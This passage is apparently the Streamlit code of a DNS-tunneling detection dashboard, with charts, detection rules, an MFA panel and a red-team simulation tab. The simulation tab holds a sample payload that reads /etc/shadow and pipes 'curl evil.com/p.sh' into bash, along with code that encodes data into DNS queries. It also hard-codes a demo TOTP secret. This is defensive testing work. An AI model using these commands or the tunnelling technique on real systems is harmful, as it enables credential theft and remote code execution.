                {'range': [0, 35], 'color': 'rgba(16, 185, 129, 0.15)'},
                {'range': [35, 70], 'color': 'rgba(234, 179, 8, 0.15)'},
                {'range': [70, 100], 'color': 'rgba(239, 68, 68, 0.2)'}
            ]
        }
    ))
    gauge_fig.update_layout(
        height=100,
        margin=dict(l=15, r=15, t=25, b=5),
        paper_bgcolor="rgba(0,0,0,0)",
        font={'color': "#f8fafc"}
    )
    st.plotly_chart(gauge_fig, use_container_width=True)

# Helper banner when PCAP upload mode is selected but no file has been provided
if data_source == "Upload Custom PCAP Capture" and not uploaded_bytes:
    st.markdown("""
    <div style="background: rgba(14, 165, 233, 0.08); border: 1px dashed rgba(56, 189, 248, 0.35); border-radius: 12px; padding: 24px; text-align: center; margin: 15px 0;">
        <span style="font-size: 32px;">📂</span>
        <h4 style="margin: 8px 0 4px 0; color: #38bdf8;">Upload a PCAP / PCAPNG Network Capture</h4>
        <p style="color: #94a3b8; font-size: 0.88rem; margin-bottom: 16px;">
            Select a network capture file using the sidebar file uploader, or download one of our pre-packaged threat captures below to test instantly:
        </p>
    </div>
    """, unsafe_allow_html=True)
    d_cols = st.columns(3)
    with d_cols[0]:
        with open(os.path.join(pcap_dir, "mixed_enterprise_traffic.pcap"), "rb") as sf:
            st.download_button("📥 Sample: Mixed Enterprise Traffic", data=sf.read(), file_name="mixed_enterprise_traffic.pcap", use_container_width=True)
    with d_cols[1]:
        with open(os.path.join(pcap_dir, "tunneling_iodine_exfil.pcap"), "rb") as sf:
            st.download_button("📥 Sample: Iodine Exfiltration Attack", data=sf.read(), file_name="tunneling_iodine_exfil.pcap", use_container_width=True)
    with d_cols[2]:
        with open(os.path.join(pcap_dir, "tunneling_dnscat2_c2.pcap"), "rb") as sf:
            st.download_button("📥 Sample: DNSCat2 Reverse Shell", data=sf.read(), file_name="tunneling_dnscat2_c2.pcap", use_container_width=True)

st.markdown("<div style='height: 10px;'></div>", unsafe_allow_html=True)

# -----------------------------------------------------------------------------
# INTERACTIVE CONSOLE TABS
# -----------------------------------------------------------------------------
tab_incidents, tab_forensics, tab_analytics, tab_inspector, tab_ml, tab_logs, tab_lab, tab_mfa = st.tabs([
    "🚨 Security Incidents",
    "🕵️ Exfiltration Forensics",
    "📈 Telemetry & Profiling",
    "⚡ Live Domain Inspector",
    "🧠 AI Engine & Rules",
    "📋 Query Stream & Export",
    "🧪 Red Team Simulation Lab",
    "🔐 Zero-Trust Identity & MFA"
])

# -----------------------------------------------------------------------------
# TAB 1: SECURITY INCIDENTS FEED
# -----------------------------------------------------------------------------
with tab_incidents:
    st.markdown("""
    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px;">
        <h4 style="margin: 0; font-weight: 700;">Correlated Threat Sessions</h4>
        <span style="font-size: 0.82rem; color: #94a3b8;">Grouped by (Client IP, Apex Domain)</span>
    </div>
    """, unsafe_allow_html=True)

    if not incidents:
        st.markdown("""
        <div style="background: rgba(16, 185, 129, 0.08); border: 1px solid rgba(16, 185, 129, 0.25); border-radius: 10px; padding: 24px; text-align: center;">
            <span style="font-size: 28px;">✅</span>
            <h4 style="color: #34d399; margin: 8px 0 4px 0;">All Traffic Legitimate & Clear</h4>
            <p style="color: #94a3b8; font-size: 0.88rem; margin: 0;">No high-entropy subdomain anomalies or covert DNS channels detected in this capture window.</p>
        </div>
        """, unsafe_allow_html=True)
    else:
        # Filter controls
        f_col1, f_col2 = st.columns([2, 1])
        with f_col1:
            severity_filter = st.radio(
                "Filter Incidents:",
                ["All Incidents", "Critical & High Only", "Critical Only"],
                horizontal=True,
                label_visibility="collapsed"
            )

        filtered_incidents = incidents
        if severity_filter == "Critical & High Only":
            filtered_incidents = [i for i in incidents if i["severity"] in ("CRITICAL", "HIGH")]
        elif severity_filter == "Critical Only":
            filtered_incidents = [i for i in incidents if i["severity"] == "CRITICAL"]

        for inc in filtered_incidents:
            sev = inc["severity"]
            sev_badge = f"badge-{sev.lower()}"
            bar_color = "#ef4444" if sev == "CRITICAL" else ("#f97316" if sev == "HIGH" else "#eab308")

            with st.container():
                st.markdown(f"""
                <div class="cyber-card" style="border-left: 4px solid {bar_color};">
                    <div style="display: flex; justify-content: space-between; align-items: flex-start; margin-bottom: 12px;">
                        <div>
                            <span class="{sev_badge}">{sev}</span>
                            <span style="margin-left: 8px; font-weight: 800; font-family: 'JetBrains Mono', monospace; font-size: 1.05rem; color: #f8fafc;">
                                {inc['incident_id']}
                            </span>
                            <span style="color: #64748b; margin: 0 8px;">•</span>
                            <span style="color: #38bdf8; font-family: 'JetBrains Mono', monospace; font-weight: 700;">
                                {inc['apex_domain']}
                            </span>
                        </div>
                        <div style="text-align: right;">
                            <span style="font-size: 0.72rem; color: #94a3b8; font-weight: 600;">THREAT RISK</span><br/>
                            <span style="font-size: 1.35rem; font-weight: 800; color: {bar_color}; font-family: 'JetBrains Mono', monospace;">
                                {inc['threat_score']}/100
                            </span>
                        </div>
                    </div>
                </div>
                """, unsafe_allow_html=True)

                with st.expander(f"🔎 Detailed Incident Analysis & Telemetry ({inc['incident_id']})", expanded=False):
                    m1, m2, m3, m4 = st.columns(4)
                    m1.markdown(f"**Client Host IP:** `{inc['client_ip']}`")
                    m2.markdown(f"**Target C2 Domain:** `{inc['apex_domain']}`")
                    m3.markdown(f"**Total Queries:** `{inc['total_queries']}` ({inc['suspicious_queries']} flagged)")
                    m4.markdown(f"**Exfiltration Volume:** `{inc['total_payload_bytes']}` bytes")

                    m5, m6, m7, m8 = st.columns(4)
                    m5.markdown(f"**Mean Entropy (H):** `{inc['avg_entropy']}` (Peak: `{inc['max_entropy']}`)")
                    m6.markdown(f"**Unique Subdomains:** `{inc['unique_subdomains']}` (DGA score)")
                    m7.markdown(f"**Query Velocity:** `{inc['query_rate_per_sec']} q/s`")
                    m8.markdown(f"**Duration:** `{inc['duration_seconds']}s`")

                    st.markdown("##### 🎯 MITRE ATT&CK Matrix Alignment")
                    mitre_html = " ".join([f"<span class='badge-mitre'>[{m['technique_id']}] {m['name']} ({m['tactic']})</span>" for m in inc["mitre_attacks"]])
                    st.markdown(mitre_html, unsafe_allow_html=True)

                    st.markdown("##### 🚩 Triggered Detection Rules")
                    for rule in inc["rules_triggered"]:
                        st.markdown(f"- 🔴 **{rule}**")

                    if inc["reconstructed_payload"]["is_decodable"]:
                        st.markdown("##### 🔓 Recovered Secret Payload Stream")
                        st.code(inc["reconstructed_payload"]["preview"], language="text")

# -----------------------------------------------------------------------------
# TAB 2: EXFILTRATION FORENSICS & PAYLOAD DECODER
# -----------------------------------------------------------------------------
with tab_forensics:
    st.markdown("""
    <div class="cyber-card">
        <h4 style="margin: 0 0 6px 0; color: #f8fafc;">Covert Payload Reassembly & Forensics</h4>
        <p style="margin: 0; font-size: 0.85rem; color: #94a3b8;">
            Tunneling malware fragments stolen data (credentials, shell output, sensitive tokens) into subdomain labels. 
            This pipeline orders chunk sequences and executes automated multi-codec decoding (Base64, Hexadecimal, Base32).
        </p>
    </div>
    """, unsafe_allow_html=True)

    decodable_sessions = [i for i in incidents if i["reconstructed_payload"]["is_decodable"]]

    if not decodable_sessions:
        st.info("ℹ️ No plain-text reconstructable strings were detected in this session. The attacker payload may be encrypted using custom symmetric ciphers (e.g. Salsa20 in DNSCat2) or all traffic is benign.")
    else:
        for idx, inc in enumerate(decodable_sessions):
            st.markdown(f"#### 📦 Forensic Session: `{inc['incident_id']}` (Target: `{inc['apex_domain']}`)")
            
            p_col1, p_col2 = st.columns([3, 1])
            with p_col1:
                st.caption("Reconstructed Continuous Byte Stream")
                st.code(inc["reconstructed_payload"]["preview"], language="text")
            with p_col2:
                st.caption("Reconstruction Summary")
                st.markdown(f"**Recovered Chunks:** `{len(inc['reconstructed_payload']['decoded_samples'])}`")
                st.markdown(f"**Total Bytes:** `{inc['total_payload_bytes']}`")
                
                # Check for sensitive patterns
                prev_text = inc["reconstructed_payload"]["preview"].upper()
                if any(k in prev_text for k in ["CARD", "PAN", "CVV", "EXP"]):
                    st.error("🚨 Credit Card PAN Pattern")
                if any(k in prev_text for k in ["PASS", "HASH", "USER", "ADMIN", "ROOT"]):
                    st.warning("⚠️ Credentials / Password Hash")
                if any(k in prev_text for k in ["CMD", "EXEC", "WHOAMI", "SH", "BASH"]):
                    st.error("⚡ Shell Command Channel")

            st.caption("Decoded Chunk Breakdown")
            df_chunks = pd.DataFrame([
                {"Sequence": i + 1, "Decoded String Payload": s, "Byte Length": len(s)}
                for i, s in enumerate(inc["reconstructed_payload"]["decoded_samples"])
            ])
            st.dataframe(df_chunks, use_container_width=True)
            st.divider()

# -----------------------------------------------------------------------------
# TAB 3: TELEMETRY PROFILING & THREAT DISTRIBUTIONS
# -----------------------------------------------------------------------------
with tab_analytics:
    st.markdown("#### 📊 Statistical Threat Profiling & Information Theory")
    
    if engine.raw_queries:
        df_queries = pd.DataFrame(engine.raw_queries)

        chart_row1_c1, chart_row1_c2 = st.columns(2)

        with chart_row1_c1:
            # Shannon Entropy Distribution Chart
            fig_entropy = px.histogram(
                df_queries,
                x="subdomain_entropy",
                color="is_suspicious",
                nbins=35,
                barmode="overlay",
                title="Shannon Entropy Distribution H(X) (Benign vs Malicious)",
                labels={"subdomain_entropy": "Shannon Entropy H(X)", "is_suspicious": "Flagged Threat"},
                color_discrete_map={True: "#ef4444", False: "#38bdf8"},
                template="plotly_dark"
            )
            fig_entropy.add_vline(
                x=entropy_thresh, line_dash="dash", line_color="#f59e0b",
                annotation_text=f"Decision Boundary ({entropy_thresh})",
                annotation_position="top left",
                annotation_font_color="#f59e0b"
            )
            fig_entropy.update_layout(
                paper_bgcolor="rgba(15, 23, 42, 0.4)",
                plot_bgcolor="rgba(15, 23, 42, 0.4)",
                font=dict(color="#94a3b8"),
                legend=dict(orientation="h", yanchor="bottom", y=1.02, xanchor="right", x=1)
            )
            st.plotly_chart(fig_entropy, use_container_width=True)

        with chart_row1_c2:
            # Subdomain Length vs Entropy Scatter Plot
            fig_scatter = px.scatter(
                df_queries,
                x="subdomain_len",
                y="subdomain_entropy",
                color="is_suspicious",
                size="query_threat_score",
                hover_data=["fqdn", "record_type", "query_threat_score"],
                title="Subdomain Length vs Shannon Entropy (Threat Cluster)",
                labels={"subdomain_len": "Subdomain Length (Chars)", "subdomain_entropy": "Shannon Entropy H(X)"},
                color_discrete_map={True: "#ef4444", False: "#38bdf8"},
                template="plotly_dark"
            )
            fig_scatter.add_vline(x=subdomain_len_thresh, line_dash="dash", line_color="#f97316")
            fig_scatter.add_hline(y=entropy_thresh, line_dash="dash", line_color="#f59e0b")
            fig_scatter.update_layout(
                paper_bgcolor="rgba(15, 23, 42, 0.4)",
                plot_bgcolor="rgba(15, 23, 42, 0.4)",
                font=dict(color="#94a3b8"),
                legend=dict(orientation="h", yanchor="bottom", y=1.02, xanchor="right", x=1)
            )
            st.plotly_chart(fig_scatter, use_container_width=True)

        chart_row2_c1, chart_row2_c2 = st.columns(2)

        with chart_row2_c1:
            # Record Types Donut Chart
            fig_pie = px.pie(
                df_queries,
                names="record_type",
                title="DNS Record Type Distribution (TXT / NULL Favor Tunneling)",
                hole=0.45,
                color_discrete_sequence=["#38bdf8", "#818cf8", "#c084fc", "#f43f5e", "#fb923c"],
                template="plotly_dark"
            )
            fig_pie.update_layout(
                paper_bgcolor="rgba(15, 23, 42, 0.4)",
                plot_bgcolor="rgba(15, 23, 42, 0.4)",
                font=dict(color="#94a3b8")
            )
            st.plotly_chart(fig_pie, use_container_width=True)

        with chart_row2_c2:
            # Temporal Query Velocity
            df_queries["time_dt"] = pd.to_datetime(df_queries["timestamp"], unit='s')
            df_ts = df_queries.set_index("time_dt").resample("5s")["fqdn"].count().reset_index()
            df_ts.columns = ["Time", "Queries"]
            fig_ts = px.line(
                df_ts,
                x="Time",
                y="Queries",
                title="Query Velocity Timeline (Exfiltration Burst Indicators)",
                template="plotly_dark",
                markers=True
            )
            fig_ts.update_traces(line_color="#06b6d4")
            fig_ts.update_layout(
                paper_bgcolor="rgba(15, 23, 42, 0.4)",
                plot_bgcolor="rgba(15, 23, 42, 0.4)",
                font=dict(color="#94a3b8")
            )
            st.plotly_chart(fig_ts, use_container_width=True)
    else:
        st.info("📡 No queries recorded yet. Start live sniffing or choose a telemetry dataset.")

# -----------------------------------------------------------------------------
# TAB 4: LIVE SINGLE-DOMAIN THREAT INSPECTOR (HIGHLY INTERACTIVE DEMO)
# -----------------------------------------------------------------------------
with tab_inspector:
    st.markdown("""
    <div class="cyber-card">
        <h4 style="margin: 0 0 6px 0;">⚡ Real-Time Domain Threat Inspector</h4>
        <p style="margin: 0; font-size: 0.85rem; color: #94a3b8;">
            Test any custom domain name in real time. The engine will instantly calculate its Shannon Entropy, 
            extract all 18 lexical properties, evaluate heuristic rules, and run the Random Forest ML classifier.
        </p>
    </div>
    """, unsafe_allow_html=True)

    ins_col1, ins_col2 = st.columns([3, 1])
    with ins_col1:
        test_domain_input = st.text_input(
            "Enter FQDN or Subdomain to Analyze:",
            value="b64-dGhpcyBpcyBhIHNlY3JldCBleGZpbHRyYXRpb24gcGF5bG9hZA==.tunnel.darknet-c2.org"
        )
    with ins_col2:
        test_qtype = st.selectbox("Record Type", ["TXT", "A", "CNAME", "NULL", "AAAA"])

    if st.button("🚀 Analyze Domain Instantly", use_container_width=True):
        feats = extract_features_from_query(test_domain_input, record_type=test_qtype)
        rule_eval = engine.rule_evaluator.evaluate(feats)
        ml_eval = engine.ml_classifier.predict(feats)
        comp_score = round((rule_eval["heuristic_score"] * 0.45) + (ml_eval["ml_score"] * 0.55), 1)

        res_c1, res_c2, res_c3, res_c4 = st.columns(4)
        
        with res_c1:
            st.metric("Shannon Entropy H(X)", f"{feats['subdomain_entropy']:.2f}")
        with res_c2:
            st.metric("Subdomain Length", f"{feats['subdomain_len']} chars")
        with res_c3:
            st.metric("ML Anomaly Score", f"{ml_eval['ml_score']:.1f}%")
        with res_c4:
            res_verdict = "MALICIOUS TUNNEL" if comp_score >= 60 else ("SUSPICIOUS" if comp_score >= 35 else "BENIGN")
            st.metric("Final Verdict", res_verdict)

        st.markdown("##### 🔍 Mathematical & Lexical Properties")
        p_df = pd.DataFrame([
            {"Feature": "Subdomain Entropy", "Value": feats["subdomain_entropy"]},
            {"Feature": "Total FQDN Length", "Value": feats["fqdn_len"]},
            {"Feature": "Subdomain Length", "Value": feats["subdomain_len"]},
            {"Feature": "Max Label Length", "Value": feats["max_label_len"]},
            {"Feature": "Hex Character Ratio", "Value": f"{feats['hex_ratio']*100:.1f}%"},
            {"Feature": "Digit Ratio", "Value": f"{feats['digit_ratio']*100:.1f}%"},
            {"Feature": "Vowel Ratio", "Value": f"{feats['vowel_ratio']*100:.1f}%"},
            {"Feature": "Longest Consonant Run", "Value": feats["longest_consonant_run"]},
            {"Feature": "Base64 Character Ratio", "Value": f"{feats['base64_ratio']*100:.1f}%"}
        ])
        st.dataframe(p_df, use_container_width=True)

        if rule_eval["triggered_rules"]:
            st.markdown("##### 🚩 Triggered Heuristics:")
            for r in rule_eval["triggered_rules"]:
                st.error(f"**{r['name']}** — {r['detail']}")
        else:
            st.success("No heuristic threshold rules violated.")

# -----------------------------------------------------------------------------
# TAB 5: AI ENGINE & RULES EXPLAINABILITY
# -----------------------------------------------------------------------------
with tab_ml:
    st.markdown("#### 🧠 Random Forest Machine Learning & Heuristic Rule Base")
    st.markdown("""
    The hybrid detection engine marries deterministic thresholding with a supervised 18-feature Random Forest model. 
    Below is the Global Feature Importance demonstrating the exact mathematical weights governing anomaly decisions.
    """)

    rf_model = engine.ml_classifier.model
    if rf_model is not None:
        importances = rf_model.feature_importances_
        df_feat = pd.DataFrame({
            "Feature Metric": ML_FEATURE_NAMES,
            "Importance Weight": importances
        }).sort_values(by="Importance Weight", ascending=True)

        fig_feat = px.bar(
            df_feat,
            x="Importance Weight",
            y="Feature Metric",
            orientation="h",
            title="Random Forest Feature Importance Distribution",
            color="Importance Weight",
            color_continuous_scale="Tealgrn",
            template="plotly_dark"
        )
        fig_feat.update_layout(
            paper_bgcolor="rgba(15, 23, 42, 0.4)",
            plot_bgcolor="rgba(15, 23, 42, 0.4)",
            font=dict(color="#94a3b8")
        )
        st.plotly_chart(fig_feat, use_container_width=True)

    st.markdown("##### 📋 Expert Detection Rules Deployed:")
    rules_table = pd.DataFrame([
        {"Rule Code": "DNS_001", "Rule Name": "Abnormal Subdomain Entropy", "Severity": "CRITICAL", "Threshold": "H(X) ≥ 3.85"},
        {"Rule Code": "DNS_002", "Rule Name": "Oversized Subdomain Payload", "Severity": "HIGH", "Threshold": "Label ≥ 42 or Subdomain ≥ 45"},
        {"Rule Code": "DNS_003", "Rule Name": "Suspicious Exfiltration Record Type", "Severity": "HIGH", "Threshold": "TXT or NULL with Subdomain ≥ 20"},
        {"Rule Code": "DNS_004", "Rule Name": "High Hexadecimal / Numeric Density", "Severity": "MEDIUM", "Threshold": "Hex Ratio ≥ 85% or Digit > 40%"},
        {"Rule Code": "DNS_005", "Rule Name": "Consonant Clustering / Low Vowels", "Severity": "MEDIUM", "Threshold": "Vowel Ratio < 10% & Consonants ≥ 7"},
        {"Rule Code": "DNS_006", "Rule Name": "Multi-Segment Tunneling Structure", "Severity": "LOW", "Threshold": "Label Count ≥ 4 & H(X) ≥ 3.6"}
    ])
    st.dataframe(rules_table, use_container_width=True)

# -----------------------------------------------------------------------------
# TAB 6: QUERY STREAM & SIEM EXPORT
# -----------------------------------------------------------------------------
with tab_logs:
    st.markdown("#### 📋 DNS Query Telemetry Stream")
    if engine.raw_queries:
        log_filter_c1, log_filter_c2 = st.columns([1, 2])
        with log_filter_c1:
            only_threats = st.checkbox("Show Flagged Threats Only", value=False)
        with log_filter_c2:
            search_query = st.text_input("Search FQDN or IP:", placeholder="e.g. darknet or 192.168")

        df_display = pd.DataFrame(engine.raw_queries)
        if only_threats:
            df_display = df_display[df_display["is_suspicious"] == True]
        if search_query:
            df_display = df_display[df_display["fqdn"].str.contains(search_query, case=False, na=False) | df_display["client_ip"].str.contains(search_query, na=False)]

        cols = ["client_ip", "record_type", "apex_domain", "subdomain_len", "subdomain_entropy", "query_threat_score", "is_suspicious", "fqdn"]
        st.dataframe(df_display[cols], use_container_width=True)

        exp_c1, exp_c2 = st.columns(2)
        with exp_c1:
            csv_bytes = df_display.to_csv(index=False).encode('utf-8')
            st.download_button("📥 Export Logs as CSV", data=csv_bytes, file_name="dns_telemetry_logs.csv", mime="text/csv", use_container_width=True)
        with exp_c2:
            siem_json = json.dumps([{k: v for k, v in i.items() if k != "raw_queries"} for i in incidents], indent=2)
            st.download_button("📥 Export SIEM Incident Report (JSON)", data=siem_json, file_name="dns_incidents_siem.json", mime="application/json", use_container_width=True)
    else:
        st.info("No query logs present in current session.")

# -----------------------------------------------------------------------------
# TAB 7: RED TEAM ATTACK SIMULATION LAB
# -----------------------------------------------------------------------------
with tab_lab:
    st.markdown("""
    <div class="cyber-card">
        <h4 style="margin: 0 0 6px 0;">⚡ Red Team Threat Synthesis Lab</h4>
        <p style="margin: 0; font-size: 0.85rem; color: #94a3b8;">
            Synthesize realistic DNS tunneling attacks on demand. Inject exfiltrated datasets (PCI-DSS credit cards, 
            compromised credentials, reverse shells) to evaluate sensor detection in real-time.
        </p>
    </div>
    """, unsafe_allow_html=True)

    sim_col1, sim_col2 = st.columns(2)
    with sim_col1:
        chosen_profile = st.selectbox(
            "Adversary Profile / Technique",
            [
                "APT29: Iodine Base64 Data Exfiltration",
                "FIN7: POS Credit Card Exfiltration (Base64)",
                "Lazarus: DNSCat2 Interactive Reverse Shell (Hex)",
                "Custom Payload Injection"
            ]
        )
        sim_target_apex = st.text_input("Target C2 Apex Domain", value="covert-apt-tunnel.org")
        sim_query_volume = st.slider("Attack Burst Volume (Queries)", 5, 60, 25)

    with sim_col2:
        if "Credit Card" in chosen_profile:
            st_payload = "PCI_DSS_EXFIL: cardholder=JaneDoe; pan=4111-2091-8842-1920; exp=09/29; cvv=914; zip=10001"
        elif "Reverse Shell" in chosen_profile:
            st_payload = "dnscat2_c2: cmd-exec-whoami | id-uid-0-root | cat /etc/shadow | curl evil.com/p.sh | bash"
        elif "APT29" in chosen_profile:
            st_payload = "SECRET_INTEL: ProjectTitan_AccessKey=ghp_984120491823719827; Prod_DB_Host=10.240.0.14"
        else:
            st_payload = st.text_area("Custom Payload String", value="CONFIDENTIAL_ENTERPRISE_DATABASE_DUMP_CHUNK_001")
        
        st.caption(f"Payload Preview: `{st_payload[:75]}...`")

    st.markdown("---")
    act_c1, act_c2 = st.columns(2)

    with act_c1:
        if st.button("🚀 Execute In-App Threat Simulation", use_container_width=True):
            test_eng = IncidentDetectionEngine(entropy_threshold=entropy_thresh)
            
            # Encode data
            if "Hex" in chosen_profile:
                encoded_data = st_payload.encode().hex()
                prefix = "dnscat."
            else:
                encoded_data = base64.b64encode(st_payload.encode()).decode()
                prefix = "b64-"

            chunk_len = 24
            chunks = [encoded_data[i:i+chunk_len] for i in range(0, len(encoded_data), chunk_len)]
            while len(chunks) < sim_query_volume:
                chunks.append(encoded_data[:chunk_len])
            chunks = chunks[:sim_query_volume]

            t_base = time.time() - sim_query_volume
            sim_q_results = []
            for idx, ch in enumerate(chunks):
                qname = f"{prefix}{ch}.chunk{idx:02d}.data.{sim_target_apex}"
                qtype = "TXT" if idx % 2 == 0 else "A"
                res = test_eng.process_query(
                    query_name=qname,
                    record_type=qtype,
                    timestamp=t_base + idx,
                    client_ip="192.168.1.189"
                )
                sim_q_results.append(res)

            sim_incs = test_eng.correlate_incidents()
            st.toast("⚡ Attack simulation executed successfully!", icon="🔥")

            if sim_incs:
                si = sim_incs[0]
                res_c1, res_c2, res_c3 = st.columns(3)
                res_c1.metric("Incident Severity", f"{si['severity']} ({si['threat_score']}/100)")
                res_c2.metric("Detection Rate", f"{round((si['suspicious_queries']/len(sim_q_results))*100)}%")
                res_c3.metric("Data Exfiltrated", f"{si['total_payload_bytes']} bytes")

                st.markdown("##### 🔓 Automated Payload Decryption Result:")
                st.code(si["reconstructed_payload"]["preview"], language="text")
            else:
                st.warning("Detection engine did not flag the incident. Try increasing query count.")

    with act_c2:
        if st.button("🌐 Broadcast Real UDP Packets to Port 53", use_container_width=True):
            from simulate_attack import build_dns_query_packet
            import socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            enc = base64.b64encode(st_payload.encode()).decode()
            chunks = [enc[i:i+24] for i in range(0, len(enc), 24)]
            while len(chunks) < sim_query_volume:
                chunks.append(enc[:24])
            chunks = chunks[:sim_query_volume]

            sent_ct = 0
            for idx, ch in enumerate(chunks):
                qname = f"b64-{ch}.seq{idx:02d}.exfil.{sim_target_apex}"
                pkt = build_dns_query_packet(qname, "TXT")
                try:
                    sock.sendto(pkt, ("127.0.0.1", 53))
                    sent_ct += 1
                except Exception:
                    pass
            sock.close()
            st.toast(f"Fired {sent_ct} real UDP packets across localhost:53", icon="📡")
            st.info(f"Fired {sent_ct} UDP packets on Port 53. If the live sniffer is running, it intercepted them on the wire!")

# -----------------------------------------------------------------------------
# TAB 8: ZERO-TRUST IDENTITY, MFA & AUDIT TRAILS
# -----------------------------------------------------------------------------
with tab_mfa:
    st.markdown("""
    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 14px;">
        <div>
            <h4 style="margin: 0; font-weight: 700; color: #f8fafc;">🔐 Zero-Trust Identity, MFA &amp; Audit Trails</h4>
            <span style="font-size: 0.82rem; color: #94a3b8;">NIST SP 800-63B Authenticator Assurance Level 2 (AAL2) &amp; RFC 6238 Management</span>
        </div>
        <span style="background: rgba(16, 185, 129, 0.15); color: #10b981; font-size: 0.76rem; padding: 4px 12px; border-radius: 999px; font-weight: 700; border: 1px solid rgba(16, 185, 129, 0.3);">
            ● MFA SESSION SECURE
        </span>
    </div>
    """, unsafe_allow_html=True)

    sec_c1, sec_c2, sec_c3, sec_c4 = st.columns(4)
    with sec_c1:
        st.metric("Operator Identity", curr_user.get("name", "N/A"))
    with sec_c2:
        st.metric("Role / Title", curr_user.get("role", "N/A"))
    with sec_c3:
        st.metric("Security Clearance", curr_user.get("access_level", "N/A"))
    with sec_c4:
        st.metric("Session Login Time", st.session_state.get("session_login_time", "Active Session"))

    st.markdown("<div style='height: 12px;'></div>", unsafe_allow_html=True)

    sub_c1, sub_c2 = st.columns([1.2, 1])
    with sub_c1:
        st.markdown("##### 🛡️ Active Hardware / Software Authenticator Enrollment")
        user_sec = curr_user.get("mfa_secret", "JBSWY3DPEHPK3PXP")
        u_uri = MFAManager.get_totp_uri(curr_user.get("username", "user"), user_sec)
        u_qr = MFAManager.generate_qr_code_base64(u_uri)
        live_token = MFAManager.get_current_live_otp_for_demo(user_sec)
        remaining_secs = 30 - (int(time.time()) % 30)

        st.markdown(f"""
        <div style="background: rgba(15, 23, 42, 0.6); border: 1px solid rgba(56, 189, 248, 0.2); border-radius: 12px; padding: 18px; display: flex; gap: 20px; align-items: center;">
            <img src="{u_qr}" style="width: 130px; height: 130px; border-radius: 10px; border: 2px solid rgba(0, 240, 255, 0.4); box-shadow: 0 0 15px rgba(0, 240, 255, 0.2);" />
            <div>
                <div style="font-size: 0.72rem; color: #94a3b8; font-weight: 700; text-transform: uppercase;">Provisioning Details</div>
                <div style="font-size: 0.88rem; font-weight: 700; color: #f8fafc; margin-top: 4px;">Registered App: <span style="color: #38bdf8;">DNS Armor SOC Console</span></div>
                <div style="font-size: 0.78rem; color: #64748b; font-family: 'JetBrains Mono', monospace; margin-top: 4px;">Base32 Secret: <b style="color: #00f0ff;">{user_sec}</b></div>
                <div style="font-size: 0.78rem; color: #94a3b8; margin-top: 6px;">
                    Algorithm: <b>HMAC-SHA1 (RFC 6238)</b> &bull; Time Step: <b>30 seconds</b> &bull; Digits: <b>6</b>
                </div>
            </div>
        </div>
        """, unsafe_allow_html=True)

        st.markdown("<div style='height: 10px;'></div>", unsafe_allow_html=True)
        st.markdown("##### ⏱️ Live Passcode Health & Clock Drift Monitor")
        p_c1, p_c2 = st.columns(2)
        with p_c1:
            st.metric("Live Active OTP", live_token, help="Current RFC 6238 rolling token.")
        with p_c2:
            st.metric("Next Code Rotation", f"{remaining_secs} seconds", delta=f"-{30 - remaining_secs}s elapsed")

    with sub_c2:
        st.markdown("##### 📜 Regulatory Compliance & Defense Matrix")
        st.markdown("""
        <div style="background: rgba(15, 23, 42, 0.6); border: 1px solid rgba(255, 255, 255, 0.06); border-radius: 12px; padding: 16px; font-size: 0.80rem; line-height: 1.6;">
            <table style="width: 100%; border-collapse: collapse;">
                <tr style="border-bottom: 1px solid rgba(255,255,255,0.08);">
                    <th style="text-align: left; padding: 6px 0; color: #94a3b8;">Standard</th>
                    <th style="text-align: left; padding: 6px 0; color: #94a3b8;">Requirement</th>
                    <th style="text-align: right; padding: 6px 0; color: #94a3b8;">Status</th>
                </tr>
                <tr style="border-bottom: 1px solid rgba(255,255,255,0.04);">
                    <td style="padding: 6px 0; color: #38bdf8; font-weight: 600;">NIST SP 800-63B</td>
                    <td style="padding: 6px 0; color: #cbd5e1;">AAL2 Multi-Factor Cryptographic TOTP</td>
                    <td style="padding: 6px 0; text-align: right; color: #10b981; font-weight: 700;">COMPLIANT</td>
                </tr>
                <tr style="border-bottom: 1px solid rgba(255,255,255,0.04);">
                    <td style="padding: 6px 0; color: #38bdf8; font-weight: 600;">PCI-DSS v4.0</td>
                    <td style="padding: 6px 0; color: #cbd5e1;">Req 8.4 MFA for all CDE Administrative Access</td>
                    <td style="padding: 6px 0; text-align: right; color: #10b981; font-weight: 700;">COMPLIANT</td>
                </tr>
                <tr style="border-bottom: 1px solid rgba(255,255,255,0.04);">
                    <td style="padding: 6px 0; color: #38bdf8; font-weight: 600;">MITRE ATT&CK</td>
                    <td style="padding: 6px 0; color: #cbd5e1;">M1032 Multi-factor Authentication Mitigation</td>
                    <td style="padding: 6px 0; text-align: right; color: #10b981; font-weight: 700;">ENFORCED</td>
                </tr>
                <tr>
                    <td style="padding: 6px 0; color: #38bdf8; font-weight: 600;">ISO/IEC 27001</td>
                    <td style="padding: 6px 0; color: #cbd5e1;">Control A.9.4.2 Secure User Log-on Procedures</td>
                    <td style="padding: 6px 0; text-align: right; color: #10b981; font-weight: 700;">VERIFIED</td>
                </tr>
            </table>
        </div>
        """, unsafe_allow_html=True)

    st.markdown("<div style='height: 14px;'></div>", unsafe_allow_html=True)
    st.markdown("##### 📋 SOC Operator Access & Authentication Audit Trail")
    audit_data = st.session_state.get("auth_audit_trail", [])
    if audit_data:
        df_audit = pd.DataFrame(audit_data)
        st.dataframe(df_audit, use_container_width=True)
    else:
        st.info("No authentication events recorded in this session.")

